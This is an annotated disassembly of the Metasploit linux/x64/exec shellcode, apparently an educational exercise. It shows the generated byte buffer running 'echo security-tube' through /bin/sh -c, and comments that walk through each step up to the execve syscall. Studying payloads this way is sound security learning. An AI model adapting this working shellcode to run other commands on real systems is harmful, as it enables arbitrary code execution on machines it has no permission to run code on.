; linux/x64/exec: Execute an arbitrary command

; msf payload(exec) > generate
; # linux/x64/exec - 58 bytes
; # http://www.metasploit.com
; # VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
; # PrependSetreuid=false, PrependSetuid=false, 
; # PrependSetresgid=false, PrependSetregid=false, 
; # PrependSetgid=false, PrependChrootBreak=false, 
; # AppendExit=false, CMD=echo security-tube
; buf = 
; "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" +
; "\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" +
; "\x13\x00\x00\x00\x65\x63\x68\x6f\x20\x73\x65\x63\x75\x72" +
; "\x69\x74\x79\x2d\x74\x75\x62\x65\x00\x56\x57\x48\x89\xe6" +
; "\x0f\x05"

; assembly code

push   0x3b						
pop    rax
cdq    
movabs rbx,0x68732f6e69622f				; rbx = (string) /bin/sh
push   rbx
mov    rdi,rsp
push   0x632d						; (string) -c
mov    rsi,rsp
push   rdx
call   0x601073 <code+51>				;  instructions invalid. This code generates the output: "security-tube" 
movsxd ebp,DWORD PTR gs:[rax+0x6f]
and    BYTE PTR [rbx+0x65],dh
movsxd esi,DWORD PTR [rbp+0x72]
imul   esi,DWORD PTR [rcx+rdi*2+0x2d],0x65627574
add    BYTE PTR [rsi+0x57],dl
mov    rsi,rsp
syscall 						; syscall __NR_execve
